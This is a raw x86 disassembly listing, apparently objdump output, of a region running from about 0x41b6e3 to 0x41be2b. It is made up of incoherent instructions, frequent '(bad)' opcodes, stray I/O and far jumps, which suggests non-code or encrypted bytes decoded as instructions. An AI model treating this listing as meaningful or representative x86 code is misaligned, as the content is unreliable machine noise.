  41b6e3:	int    0xc8
  41b6e5:	scas   eax,DWORD PTR es:[edi]
  41b6e6:	jno    0x41b6ca
  41b6e8:	xchg   ecx,eax
  41b6e9:	fnstenv ds:0xdef78717
  41b6ef:	or     eax,0xb0849a73
  41b6f4:	xor    bh,BYTE PTR [ecx+0x44]
  41b6f7:	mov    WORD PTR [esi+0x1c],es
  41b6fa:	test   al,0xc0
  41b6fc:	out    0xe,al
  41b6fe:	mov    esi,0x85cee5c4
  41b703:	pop    eax
  41b704:	xchg   ebx,eax
  41b705:	sub    bl,BYTE PTR [edx+0x78e6badc]
  41b70b:	dec    edx
  41b70c:	jo     0x41b6db
  41b70e:	or     al,0xd
  41b710:	inc    esi
  41b711:	jne    0x41b71f
  41b713:	mov    edx,0xd6de9b70
  41b718:	jecxz  0x41b69c
  41b71a:	aas    
  41b71b:	push   ss
  41b71c:	sbb    ebx,DWORD PTR [ecx+0xbe06059]
  41b722:	pop    ebp
  41b723:	stc    
  41b724:	add    eax,0x332055c4
  41b729:	(bad)  [ecx+0x637d5df3]
  41b72f:	xor    ah,0x36
  41b732:	or     ch,dl
  41b734:	shr    BYTE PTR [edx],1
  41b736:	test   DWORD PTR [ecx+0x75],eax
  41b739:	fisub  DWORD PTR [ecx]
  41b73b:	ret    0xfc35
  41b73e:	mov    ecx,0x6b0f4d3c
  41b743:	pop    es
  41b744:	mov    fs,ecx
  41b746:	lds    ebp,FWORD PTR [ebx]
  41b748:	sti    
  41b749:	cmp    al,0x28
  41b74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b74c:	int    0x54
  41b74e:	cmp    al,0x6a
  41b750:	sbb    DWORD PTR [eax],edx
  41b752:	push   ss
  41b753:	stos   BYTE PTR es:[edi],al
  41b754:	xlat   BYTE PTR ds:[ebx]
  41b755:	adc    DWORD PTR [ecx],0x56
  41b758:	stos   DWORD PTR es:[edi],eax
  41b759:	cmp    eax,0xab985803
  41b75e:	fmul   DWORD PTR [eax+0x57fe2c3]
  41b764:	loope  0x41b7c2
  41b766:	mov    ebx,esp
  41b768:	sub    al,0xde
  41b76a:	ja     0x41b70b
  41b76c:	or     DWORD PTR [eax-0x14],ebp
  41b76f:	mov    ebx,0x51355a0f
  41b774:	les    esi,FWORD PTR [edi]
  41b776:	lods   al,BYTE PTR ds:[esi]
  41b777:	mov    BYTE PTR [esi],ah
  41b779:	aad    0x61
  41b77b:	pop    ebx
  41b77c:	pop    esi
  41b77d:	addr16 imul eax
  41b780:	mov    es,WORD PTR [edi-0x5cb86c4f]
  41b786:	das    
  41b787:	int    0x24
  41b789:	test   al,0x51
  41b78b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b78c:	les    edx,FWORD PTR [ebx-0x464974f6]
  41b792:	jbe    0x41b7c8
  41b794:	and    BYTE PTR [ebx],bl
  41b796:	xor    BYTE PTR [edx-0x184fb2d0],cl
  41b79c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b79d:	iret   
  41b79e:	cmp    ecx,DWORD PTR [eax-0x71]
  41b7a1:	lods   al,BYTE PTR ds:[esi]
  41b7a2:	jmp    0x58d81f9f
  41b7a7:	xlat   BYTE PTR ds:[ebx]
  41b7a8:	cli    
  41b7a9:	push   eax
  41b7aa:	pop    edx
  41b7ab:	retf   
  41b7ac:	and    BYTE PTR [ecx+0x1c],dh
  41b7af:	ret    
  41b7b0:	dec    esi
  41b7b1:	xchg   BYTE PTR [ecx],dl
  41b7b3:	jbe    0x41b738
  41b7b5:	enter  0x6bf7,0xae
  41b7b9:	retf   
  41b7ba:	lods   al,BYTE PTR ds:[esi]
  41b7bb:	dec    esp
  41b7bc:	fsubr  DWORD PTR [ecx]
  41b7be:	stos   BYTE PTR es:[edi],al
  41b7bf:	push   ebp
  41b7c0:	jae    0x41b7c7
  41b7c2:	popa   
  41b7c3:	pusha  
  41b7c4:	mov    ah,0xfe
  41b7c6:	sbb    ecx,eax
  41b7c8:	dec    edx
  41b7c9:	xor    al,0x9a
  41b7cb:	test   al,0x35
  41b7cd:	shl    DWORD PTR [ebp+0x4ff5bd66],0x6a
  41b7d4:	jp     0x41b84c
  41b7d6:	bound  ebx,QWORD PTR [ebp-0xe860f88]
  41b7dc:	mov    al,ds:0x63627f1d
  41b7e1:	mov    ch,0x7a
  41b7e3:	repnz cmp DWORD PTR [ebx],ebx
  41b7e6:	aas    
  41b7e7:	dec    esp
  41b7e8:	sub    DWORD PTR [ebx+0x113d918d],0x938c9dd5
  41b7f2:	sub    esi,DWORD PTR [edi+0x2c7af895]
  41b7f8:	pop    ss
  41b7f9:	aas    
  41b7fa:	iret   
  41b7fb:	test   DWORD PTR [ebx],ecx
  41b7fd:	(bad)  
  41b7fe:	aad    0x6f
  41b800:	shl    DWORD PTR [edx],cl
  41b802:	(bad)  
  41b803:	mov    ds:0xdc83c41b,eax
  41b808:	dec    edi
  41b809:	rcr    BYTE PTR [ebx],1
  41b80b:	jae    0x41b7df
  41b80d:	ss out 0xb,al
  41b810:	std    
  41b811:	adc    eax,0x5cb32e82
  41b816:	je     0x41b798
  41b818:	repnz arpl WORD PTR [eax-0x9],bx
  41b81c:	xchg   sp,ax
  41b81e:	sub    esp,DWORD PTR [edi]
  41b820:	aas    
  41b821:	mov    eax,DWORD PTR [edx]
  41b823:	sbb    DWORD PTR [eax+0x31c06d58],esi
  41b829:	nop
  41b82a:	add    esp,eax
  41b82c:	mov    esi,0xaf4acdf1
  41b831:	fisub  WORD PTR [edx+edi*2]
  41b834:	arpl   WORD PTR [esi+0x66],bx
  41b837:	cs ja  0x41b7ce
  41b83a:	and    al,0xab
  41b83c:	mov    cl,0xe
  41b83e:	mov    cl,ah
  41b840:	xchg   esp,eax
  41b841:	jmp    0x9b1da55
  41b846:	daa    
  41b847:	push   ebx
  41b848:	fmul   QWORD PTR [ecx-0x8421710]
  41b84e:	pop    esp
  41b84f:	or     ch,BYTE PTR [bx+si]
  41b852:	cli    
  41b853:	stc    
  41b854:	mov    DWORD PTR [ecx],esi
  41b856:	push   ebp
  41b857:	pop    ebp
  41b858:	sbb    BYTE PTR [ebx+edx*2+0x69],ch
  41b85c:	adc    eax,0xb55a5fcf
  41b861:	pushf  
  41b862:	jns    0x41b87b
  41b864:	iret   
  41b865:	popa   
  41b866:	mov    eax,0x26c5e4b0
  41b86b:	pop    eax
  41b86c:	jne    0x41b823
  41b86e:	xchg   esi,eax
  41b86f:	sub    DWORD PTR ds:[ebp-0x14],0x5b
  41b874:	fcmovnb st,st(6)
  41b876:	or     DWORD PTR [esi],eax
  41b878:	scas   al,BYTE PTR es:[edi]
  41b879:	push   esi
  41b87a:	fisubr WORD PTR [edx]
  41b87c:	int    0xf
  41b87e:	and    al,0x69
  41b880:	push   esp
  41b881:	or     eax,0xff18d951
  41b886:	dec    esp
  41b887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b888:	cmp    BYTE PTR [edx+0x2e],dh
  41b88b:	dec    esi
  41b88c:	adc    ah,BYTE PTR [esi-0x5b]
  41b88f:	ret    
  41b890:	push   ecx
  41b891:	adc    BYTE PTR [eax+0x71],bh
  41b894:	in     eax,dx
  41b895:	dec    ebp
  41b896:	cs fucomip st,st(2)
  41b899:	mov    DWORD PTR [edi+0x4e],ebp
  41b89c:	pop    ss
  41b89d:	cmc    
  41b89e:	mov    bl,BYTE PTR [esi]
  41b8a0:	or     al,0xc3
  41b8a2:	cmc    
  41b8a3:	sub    BYTE PTR ds:0x59f15b6f,0x21
  41b8aa:	mov    ds:0xbb1fc4d7,al
  41b8af:	mov    ebp,0xcac42bf6
  41b8b4:	(bad)  
  41b8b5:	adc    edx,DWORD PTR [ebx+eax*4+0x1f]
  41b8b9:	jmp    0xccdd8bb2
  41b8be:	jnp    0x41b875
  41b8c0:	ret    0x9013
  41b8c3:	lea    edx,[eax]
  41b8c5:	addr16 pusha 
  41b8c7:	sub    BYTE PTR [edi+0x3b],dl
  41b8ca:	stos   BYTE PTR es:[di],al
  41b8cc:	jo     0x41b86a
  41b8ce:	sbb    BYTE PTR [edx+0x4],0xb8
  41b8d2:	cmp    ch,al
  41b8d4:	and    DWORD PTR [esi-0x4],eax
  41b8d7:	in     al,dx
  41b8d8:	xchg   esp,edi
  41b8da:	or     eax,0x17d9936
  41b8df:	mov    dh,0xb8
  41b8e1:	fsub   QWORD PTR [ecx]
  41b8e3:	xchg   ebx,eax
  41b8e4:	fld    QWORD PTR [esi+0x2d]
  41b8e7:	xor    BYTE PTR [ebx-0x2a],dh
  41b8ea:	int3   
  41b8eb:	xor    al,0xb7
  41b8ed:	idiv   dh
  41b8ef:	mov    al,0xc8
  41b8f1:	mov    edi,0x61075293
  41b8f6:	xchg   edi,eax
  41b8f7:	dec    DWORD PTR [esi]
  41b8f9:	xor    eax,0x37ff41c5
  41b8fe:	mov    eax,ds:0x36127c84
  41b903:	push   ebp
  41b904:	arpl   WORD PTR [edi-0x6b28af42],di
  41b90a:	jmp    0x7516:0xcedb4ac
  41b911:	mov    ebp,0x68d61a56
  41b916:	jmp    0x41b93d
  41b918:	xor    BYTE PTR [edi-0x605815af],dl
  41b91e:	sahf   
  41b91f:	pop    edx
  41b920:	pop    ds
  41b921:	mov    ch,0xd9
  41b923:	inc    eax
  41b924:	push   eax
  41b925:	fisub  WORD PTR [eax+0x2b]
  41b928:	xor    esi,esi
  41b92a:	lods   al,BYTE PTR ds:[esi]
  41b92b:	pop    es
  41b92c:	sahf   
  41b92d:	add    esi,DWORD PTR [eax]
  41b92f:	sbb    al,0xe0
  41b931:	mov    esi,0xb2f59e9b
  41b936:	xchg   DWORD PTR [eax-0x282cf508],ebx
  41b93c:	xchg   edx,eax
  41b93d:	mov    al,ds:0x87d2e915
  41b942:	adc    eax,0x6c22a50c
  41b947:	dec    esp
  41b948:	or     BYTE PTR [edx],dl
  41b94a:	cs xchg esi,eax
  41b94c:	jge    0x41b90f
  41b94e:	push   edi
  41b94f:	sub    DWORD PTR ds:0xe51c1609,0xc56f9096
  41b959:	loope  0x41b91c
  41b95b:	pusha  
  41b95c:	push   ebp
  41b95d:	lahf   
  41b95e:	dec    ebx
  41b95f:	cdq    
  41b960:	sub    ch,BYTE PTR [ebx+0x417639df]
  41b966:	adc    eax,0xbb986bd6
  41b96b:	(bad)  
  41b96c:	mov    ebx,0x5d53c08c
  41b971:	jmp    0xd215e6e6
  41b976:	call   0x1ce5c3f
  41b97b:	push   cs
  41b97c:	or     BYTE PTR [edx],ah
  41b97e:	and    dh,dl
  41b980:	xchg   BYTE PTR [ebx+0x6372d187],bh
  41b986:	int    0x4a
  41b988:	imul   esp,DWORD PTR [ebx],0x4c
  41b98b:	mov    DWORD PTR [edi],edi
  41b98d:	ja     0x41ba01
  41b98f:	iret   
  41b990:	dec    eax
  41b991:	xor    esi,DWORD PTR [ecx+ebx*4+0x7b1dfa87]
  41b998:	ret    0x85a
  41b99b:	dec    edx
  41b99c:	mov    WORD PTR [ecx-0x78bd6635],fs
  41b9a2:	cs neg esp
  41b9a5:	dec    edi
  41b9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9a7:	push   edi
  41b9a8:	(bad)  
  41b9a9:	ffree  st(0)
  41b9ab:	retf   0xf740
  41b9ae:	and    al,0x4d
  41b9b0:	xchg   ecx,eax
  41b9b1:	sbb    eax,0x578809a5
  41b9b6:	cmp    ebx,ecx
  41b9b8:	aas    
  41b9b9:	aas    
  41b9ba:	loope  0x41b9af
  41b9bc:	xchg   esp,eax
  41b9bd:	ja     0x41ba1f
  41b9bf:	push   0xffffffb2
  41b9c1:	scas   al,BYTE PTR es:[edi]
  41b9c2:	xor    cl,BYTE PTR [ebx-0x9bfd057]
  41b9c8:	outs   dx,DWORD PTR ds:[esi]
  41b9c9:	xor    al,BYTE PTR ds:0x5940bc79
  41b9cf:	mov    ds:0x76144872,al
  41b9d4:	(bad)  
  41b9d5:	and    ebp,esi
  41b9d7:	mov    ah,0xdf
  41b9d9:	sbb    BYTE PTR [esi+0x6077659c],ch
  41b9df:	and    BYTE PTR [ebx+edi*2+0xf],dl
  41b9e3:	repz test al,0x8e
  41b9e6:	jo     0x41b9d0
  41b9e8:	dec    edi
  41b9e9:	outs   dx,BYTE PTR ds:[esi]
  41b9ea:	or     edx,DWORD PTR [esi-0x3680fad6]
  41b9f0:	cmp    eax,DWORD PTR [ebx]
  41b9f2:	shr    DWORD PTR [ebp-0x55],0x42
  41b9f6:	or     DWORD PTR fs:[esi],0xffffffc2
  41b9fa:	or     DWORD PTR [edx+0x9],esp
  41b9fd:	mov    bl,0xda
  41b9ff:	mov    ss,WORD PTR [edx-0x70092e97]
  41ba05:	gs call 0x7ea0aec7
  41ba0b:	scas   eax,DWORD PTR es:[edi]
  41ba0c:	xchg   DWORD PTR [edi],esp
  41ba0e:	mov    ebp,0x356df764
  41ba13:	xchg   edi,eax
  41ba14:	xor    eax,0x990a3a8b
  41ba19:	call   0xcf4a238c
  41ba1e:	pop    ebx
  41ba1f:	in     al,dx
  41ba20:	mov    edi,0x6f8cac15
  41ba25:	stos   BYTE PTR es:[edi],al
  41ba26:	test   BYTE PTR [edi-0xf],ah
  41ba29:	pop    edx
  41ba2a:	mov    cl,0xbd
  41ba2c:	add    ebp,DWORD PTR [ebx]
  41ba2e:	scas   al,BYTE PTR es:[edi]
  41ba2f:	je     0x41ba8f
  41ba31:	pop    ds
  41ba32:	pop    eax
  41ba33:	(bad)  
  41ba34:	push   esp
  41ba35:	les    edi,FWORD PTR [ebp+0x24]
  41ba38:	mov    eax,ds:0xe033d801
  41ba3d:	adc    DWORD PTR [edi],0xffffffad
  41ba40:	call   0x6e49:0xd6248783
  41ba47:	pop    ecx
  41ba48:	mov    ebp,0x422996a2
  41ba4d:	aam    0xce
  41ba4f:	out    0xda,al
  41ba51:	xor    eax,0xb480dc8b
  41ba56:	cmp    al,0xf9
  41ba58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba59:	iret   
  41ba5a:	stos   DWORD PTR es:[edi],eax
  41ba5b:	outs   dx,DWORD PTR ds:[esi]
  41ba5c:	sbb    ecx,esi
  41ba5e:	sar    DWORD PTR cs:[edx-0x3b],cl
  41ba62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba63:	sub    eax,0xa0fdf351
  41ba68:	dec    ebx
  41ba69:	daa    
  41ba6a:	ins    BYTE PTR es:[edi],dx
  41ba6b:	lahf   
  41ba6c:	sar    DWORD PTR [ecx+ecx*2-0xe834761],1
  41ba73:	sbb    dl,BYTE PTR [edx-0x6c]
  41ba76:	pop    ds
  41ba77:	and    BYTE PTR [eax],dl
  41ba79:	inc    esp
  41ba7a:	or     al,bl
  41ba7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba7d:	inc    edx
  41ba7e:	cs jmp 0x9ef7c907
  41ba84:	call   0x18c5:0xabb7f899
  41ba8b:	xchg   ecx,eax
  41ba8c:	mov    ebx,0x9008017d
  41ba91:	fsub   QWORD PTR [edi+0x2f]
  41ba94:	data16 int 0xf1
  41ba97:	cld    
  41ba98:	push   es
  41ba99:	xlat   BYTE PTR ds:[ebx]
  41ba9a:	push   ecx
  41ba9b:	int    0xa0
  41ba9d:	cdq    
  41ba9e:	jbe    0x41baa9
  41baa0:	mov    BYTE PTR [eax+0x18bb6740],bh
  41baa6:	bound  ebx,QWORD PTR [ecx-0x1a]
  41baa9:	jge    0x41baf6
  41baab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baac:	call   0x6b8fa9b4
  41bab1:	mov    edx,0x1c77fb35
  41bab6:	xchg   esp,eax
  41bab7:	cs in  al,0xb6
  41baba:	in     eax,dx
  41babb:	cli    
  41babc:	ret    0x71e1
  41babf:	mov    eax,ds:0x7641dd08
  41bac4:	fwait
  41bac5:	cs in  eax,0x3
  41bac8:	mov    ah,0x9f
  41baca:	ds iret 
  41bacc:	push   ebp
  41bacd:	inc    ebx
  41bace:	aaa    
  41bacf:	xor    al,0x41
  41bad1:	shl    DWORD PTR [edx],cl
  41bad3:	inc    edx
  41bad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bad5:	inc    esi
  41bad6:	int    0xdd
  41bad8:	sbb    ah,BYTE PTR [esi]
  41bada:	mov    DWORD PTR [ebp+0x34],ecx
  41badd:	mov    ecx,0x96f71adf
  41bae2:	test   al,0x18
  41bae4:	outs   dx,BYTE PTR ds:[esi]
  41bae5:	push   es
  41bae6:	push   esi
  41bae7:	ja     0x41bb2a
  41bae9:	add    esi,edi
  41baeb:	jle    0x41bb25
  41baed:	into   
  41baee:	jno    0x41bb0b
  41baf0:	call   esi
  41baf2:	sub    ch,BYTE PTR [edi-0x14]
  41baf5:	and    al,BYTE PTR [eax+0x71]
  41baf8:	inc    edx
  41baf9:	mov    dl,0x9b
  41bafb:	mov    ebx,ecx
  41bafd:	and    bh,dh
  41baff:	rcl    bl,1
  41bb01:	pushf  
  41bb02:	jle    0x41bad4
  41bb04:	sbb    cl,BYTE PTR [ebp+eax*2+0x2e]
  41bb08:	inc    esi
  41bb09:	cwde   
  41bb0a:	cmp    al,0x52
  41bb0c:	popa   
  41bb0d:	test   al,0x8e
  41bb0f:	pop    es
  41bb10:	stos   DWORD PTR es:[edi],eax
  41bb11:	ja     0x41bb1f
  41bb13:	std    
  41bb14:	pop    es
  41bb15:	ret    0x32d9
  41bb18:	or     dh,BYTE PTR [edx]
  41bb1a:	mov    esp,0x48ebf570
  41bb1f:	and    DWORD PTR [ebx+eiz*4+0x1],esi
  41bb23:	ror    bh,0xe3
  41bb26:	fucomi st,st(1)
  41bb28:	cmp    al,0xe1
  41bb2a:	ss nop
  41bb2c:	xchg   dl,ah
  41bb2e:	mov    esp,0xfa538b29
  41bb33:	mov    ah,0xac
  41bb35:	add    eax,0xfbbf3bfa
  41bb3a:	pop    ebx
  41bb3b:	push   esi
  41bb3c:	cmp    DWORD PTR [edx],eax
  41bb3e:	sbb    BYTE PTR [edi],dl
  41bb40:	add    al,0x7e
  41bb42:	mov    DWORD PTR [esi],eax
  41bb44:	(bad)  
  41bb45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb46:	inc    esp
  41bb47:	lahf   
  41bb48:	fsub   QWORD PTR [eax+0x37]
  41bb4b:	push   ebx
  41bb4c:	mov    edx,0xd568ce0c
  41bb51:	jno    0x41bb04
  41bb53:	pushf  
  41bb54:	and    esi,esp
  41bb56:	inc    eax
  41bb57:	repz xchg ebx,eax
  41bb59:	push   cs
  41bb5a:	out    dx,al
  41bb5b:	je     0x41bbaf
  41bb5d:	fwait
  41bb5e:	div    ebp
  41bb60:	icebp  
  41bb61:	aas    
  41bb62:	pop    ds
  41bb63:	add    edx,0xffffffbf
  41bb66:	mul    BYTE PTR [eax-0x933d89a]
  41bb6c:	and    ch,BYTE PTR [ecx+eax*4-0x35fcfbdd]
  41bb73:	mov    edx,0x583b31dd
  41bb78:	addr16 mov edi,0x8a6faa23
  41bb7e:	mov    cl,0xf2
  41bb80:	xor    ebp,DWORD PTR [ebx+0x14]
  41bb83:	call   0x30b9:0x3b6f582f
  41bb8a:	sti    
  41bb8b:	push   cs
  41bb8c:	mov    dl,0x1d
  41bb8e:	fsubr  st,st(7)
  41bb90:	inc    eax
  41bb91:	sub    dh,BYTE PTR [edi-0x31f34cae]
  41bb97:	pushf  
  41bb98:	push   ds
  41bb99:	cli    
  41bb9a:	shl    dl,1
  41bb9c:	arpl   WORD PTR [esi+edx*8],bx
  41bb9f:	or     BYTE PTR [eax+eiz*1+0x1d],ah
  41bba3:	pop    ecx
  41bba4:	shl    ebp,0xf0
  41bba7:	adc    BYTE PTR [edx+0x3f08c16e],bl
  41bbad:	and    al,ch
  41bbaf:	ror    ebx,1
  41bbb1:	mov    WORD PTR [bx+di],?
  41bbb4:	jmp    0xacfcd0e3
  41bbb9:	and    BYTE PTR [ecx+edi*4],dl
  41bbbc:	jno    0x41bc12
  41bbbe:	in     eax,dx
  41bbbf:	mov    ebx,0x17264d9
  41bbc4:	add    DWORD PTR [esi+0x32fd81e2],ebx
  41bbca:	sbb    dh,BYTE PTR [edx+0x3]
  41bbcd:	aam    0x98
  41bbcf:	test   al,0x6c
  41bbd1:	sbb    ah,BYTE PTR [esi-0x29]
  41bbd4:	fs sub esi,ebp
  41bbd7:	loopne 0x41bc37
  41bbd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbda:	loop   0x41bb98
  41bbdc:	popa   
  41bbdd:	popf   
  41bbde:	out    dx,eax
  41bbdf:	sbb    BYTE PTR [edx+eiz*4+0x70050251],0x67
  41bbe7:	daa    
  41bbe8:	stc    
  41bbe9:	aaa    
  41bbea:	fdiv   QWORD PTR [edx+0x7bf21ffc]
  41bbf0:	adc    bh,BYTE PTR [esi+0x4fa4c0e2]
  41bbf6:	imul   ebp,DWORD PTR [bx+si+0x4a4d],0x90310aca
  41bbff:	pop    ss
  41bc00:	jb     0x41bc65
  41bc02:	jle    0x41bb87
  41bc04:	mov    ebx,0x4b50d8b3
  41bc09:	aas    
  41bc0a:	js     0x41bc58
  41bc0c:	loope  0x41bc3e
  41bc0e:	pop    esp
  41bc0f:	int3   
  41bc10:	inc    edi
  41bc11:	mov    ch,0xd0
  41bc13:	mov    ebx,edi
  41bc15:	fimul  WORD PTR [eax]
  41bc17:	adc    BYTE PTR [esi+ebx*8],cl
  41bc1a:	imul   ebp,DWORD PTR [ebx-0x63],0xd1eace5b
  41bc21:	lods   eax,DWORD PTR ds:[esi]
  41bc22:	mov    ds:0x8499d4a1,eax
  41bc27:	or     al,0xb1
  41bc29:	ins    BYTE PTR es:[edi],dx
  41bc2a:	jno    0x41bbec
  41bc2c:	int3   
  41bc2d:	sbb    DWORD PTR [edx+edx*2+0x656eb3a],ecx
  41bc34:	(bad)  
  41bc35:	pop    ebx
  41bc36:	call   0x259f:0xc325b5ab
  41bc3d:	outs   dx,BYTE PTR ds:[esi]
  41bc3e:	mov    ?,WORD PTR [edx+ecx*1+0x5c8dacfa]
  41bc45:	fcom   DWORD PTR [esi-0xdf05218]
  41bc4b:	xchg   DWORD PTR [edx+esi*8+0x66],ebx
  41bc4f:	mov    bl,0xe7
  41bc51:	push   eax
  41bc52:	dec    edx
  41bc53:	aam    0x0
  41bc55:	(bad)  
  41bc56:	mov    al,ds:0x205473ad
  41bc5b:	push   ebp
  41bc5c:	popf   
  41bc5d:	ret    0x1309
  41bc60:	ins    BYTE PTR es:[edi],dx
  41bc61:	and    BYTE PTR [ebp+0xaf8e64c],dl
  41bc67:	xchg   ebp,eax
  41bc68:	adc    eax,DWORD PTR [ecx+0x3648cba3]
  41bc6e:	in     al,dx
  41bc6f:	popa   
  41bc70:	mov    ecx,0xdb738c67
  41bc75:	jmp    0x9eee0190
  41bc7a:	push   0xffffffef
  41bc7c:	inc    esi
  41bc7d:	or     ch,BYTE PTR [ecx-0x444b252d]
  41bc83:	dec    esp
  41bc84:	push   edx
  41bc85:	push   ebx
  41bc86:	shr    DWORD PTR [eax],1
  41bc88:	dec    ecx
  41bc89:	xchg   ebx,eax
  41bc8a:	jmp    0x78a651d5
  41bc8f:	and    edi,DWORD PTR [eax-0x38ec79e6]
  41bc95:	stos   DWORD PTR es:[edi],eax
  41bc96:	or     eax,0x863b39e6
  41bc9b:	xor    DWORD PTR [esi+0x651c189b],esi
  41bca1:	shl    DWORD PTR ss:[eax-0x2c5881e7],0x35
  41bca9:	and    eax,0xfd1367a7
  41bcae:	mov    eax,0x5aad4e37
  41bcb3:	mov    ah,BYTE PTR [eax-0x609b66ac]
  41bcb9:	inc    esp
  41bcba:	movlps xmm6,QWORD PTR ds:0x458638de
  41bcc1:	mov    ch,0x26
  41bcc3:	loope  0x41bca1
  41bcc5:	mov    ebp,0x70423a17
  41bcca:	mov    esp,0x6e07945c
  41bccf:	jge    0x41bcd2
  41bcd1:	push   esp
  41bcd2:	nop
  41bcd3:	call   0xad682ca9
  41bcd8:	sbb    BYTE PTR [ebp+0x2a],bh
  41bcdb:	mov    esp,0xf639d164
  41bce0:	stos   BYTE PTR es:[edi],al
  41bce1:	pop    ds
  41bce2:	xor    eax,esp
  41bce4:	add    eax,DWORD PTR [ebx]
  41bce6:	sub    BYTE PTR [ecx+0x25ac843d],0x61
  41bced:	imul   edi,DWORD PTR [esi+0x47],0xf8871ea8
  41bcf4:	sub    ecx,DWORD PTR [esp+eiz*4]
  41bcf7:	loope  0x41bcd2
  41bcf9:	dec    esi
  41bcfa:	pop    ecx
  41bcfb:	das    
  41bcfc:	sub    al,0xa
  41bcfe:	retf   0xb50a
  41bd01:	outs   dx,BYTE PTR ds:[esi]
  41bd02:	scas   eax,DWORD PTR es:[edi]
  41bd03:	sbb    bh,BYTE PTR [ebx]
  41bd05:	lods   al,BYTE PTR ds:[esi]
  41bd06:	push   DWORD PTR [esi]
  41bd08:	mov    ch,0xcf
  41bd0a:	loopne 0x41bd58
  41bd0c:	ja     0x41bd4c
  41bd0e:	sbb    esi,DWORD PTR [ebx+eax*1]
  41bd11:	in     al,dx
  41bd12:	mov    bh,0x9e
  41bd14:	inc    ecx
  41bd15:	ret    
  41bd16:	mov    esp,0x96b8c763
  41bd1b:	adc    ah,0x9d
  41bd1e:	and    ah,BYTE PTR [esi]
  41bd20:	das    
  41bd21:	sbb    al,BYTE PTR [eax]
  41bd23:	not    BYTE PTR [eax]
  41bd25:	xor    eax,0x3b3a024
  41bd2a:	adc    eax,0xb7f5a8ee
  41bd2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd30:	scas   eax,DWORD PTR es:[edi]
  41bd31:	mov    cl,0xba
  41bd33:	loop   0x41bcc4
  41bd35:	jns    0x41bce6
  41bd37:	pop    ecx
  41bd38:	or     eax,0xd14897c0
  41bd3d:	cld    
  41bd3e:	adc    DWORD PTR [edi],edx
  41bd40:	xchg   esi,eax
  41bd41:	xchg   edi,eax
  41bd42:	out    0xf3,al
  41bd44:	adc    esp,edx
  41bd46:	test   al,0xef
  41bd48:	jecxz  0x41bd49
  41bd4a:	add    BYTE PTR [ebp-0x3d2f0552],dl
  41bd50:	cmp    ebp,DWORD PTR [ebx-0x1]
  41bd53:	inc    esi
  41bd54:	pop    ss
  41bd55:	push   es
  41bd56:	hlt    
  41bd57:	mov    esp,0x5fd92815
  41bd5c:	add    dl,BYTE PTR [ecx+edi*8+0x69]
  41bd60:	mov    al,ds:0xdbce8259
  41bd65:	xchg   ebx,eax
  41bd66:	jge    0x41bd57
  41bd68:	loopne 0x41bd4a
  41bd6a:	sub    BYTE PTR ds:0xc5b940dc,cl
  41bd70:	repz ds inc edx
  41bd73:	ins    BYTE PTR es:[edi],dx
  41bd74:	push   ecx
  41bd75:	ss push ss
  41bd77:	mov    ebx,0x3ed22007
  41bd7c:	sub    eax,DWORD PTR [edx]
  41bd7e:	out    0x7d,al
  41bd80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd81:	add    DWORD PTR [esi+0x13d46d6c],0x6a2b37d0
  41bd8b:	jns    0x41bdae
  41bd8d:	xchg   ecx,eax
  41bd8e:	shr    BYTE PTR [edi-0x4c],0xc9
  41bd92:	ins    DWORD PTR es:[di],dx
  41bd94:	(bad)  
  41bd95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd96:	cwde   
  41bd97:	push   esp
  41bd98:	sub    al,0xbe
  41bd9a:	mov    ?,WORD PTR [ebp+0x3d]
  41bd9d:	sbb    eax,0x6dc4cb87
  41bda2:	sbb    al,cl
  41bda4:	sub    ah,BYTE PTR [edi+0x2ee2366a]
  41bdaa:	popf   
  41bdab:	pop    esi
  41bdac:	cmp    ebx,DWORD PTR [ebx+0x529410af]
  41bdb2:	in     al,0x9a
  41bdb4:	cmp    bh,BYTE PTR [esi]
  41bdb6:	fdivr  QWORD PTR [ecx+0x30383fec]
  41bdbc:	fcmovb st,st(4)
  41bdbe:	jne    0x41bd55
  41bdc0:	jg     0x41bd71
  41bdc2:	mov    cl,0x53
  41bdc4:	je     0x41be25
  41bdc6:	int    0xda
  41bdc8:	cmp    DWORD PTR [ebp+0x3d],ebp
  41bdcb:	inc    ecx
  41bdcc:	stc    
  41bdcd:	sub    al,0xe2
  41bdcf:	popf   
  41bdd0:	lock dec eax
  41bdd2:	sub    BYTE PTR [ecx+0x659a0358],cl
  41bdd8:	mov    ds:0x8371c9d0,al
  41bddd:	out    0xf1,al
  41bddf:	or     BYTE PTR [esi+esi*1],ah
  41bde2:	sub    ecx,ebx
  41bde4:	pusha  
  41bde5:	push   cs
  41bde6:	shl    edx,1
  41bde8:	jns    0x41be12
  41bdea:	push   ds
  41bdeb:	xchg   esp,eax
  41bdec:	in     eax,dx
  41bded:	shl    dl,0x80
  41bdf0:	sub    eax,0xee7e4bd2
  41bdf5:	test   BYTE PTR [ecx],bh
  41bdf7:	jle    0x41bd96
  41bdf9:	js     0x41be49
  41bdfb:	call   0x1465:0xbe666524
  41be02:	jp     0x41be54
  41be04:	jmp    0x95b85a34
  41be09:	(bad)  
  41be0b:	inc    edi
  41be0c:	add    bl,BYTE PTR [ebx]
  41be0e:	mov    ds:0x895f1e62,al
  41be13:	ret    
  41be14:	sub    al,0x4b
  41be16:	gs pop ebp
  41be18:	xchg   esp,eax
  41be19:	aad    0x56
  41be1b:	cmc    
  41be1c:	int    0xb0
  41be1e:	cld    
  41be1f:	ins    DWORD PTR es:[edi],dx
  41be20:	enter  0x447f,0x5e
  41be24:	ds (bad) 
  41be26:	cs push esp
  41be28:	and    al,0x1d
  41be2a:	(bad)  
  41be2b:	rol    BYTE PTR [edi+ecx*1],1
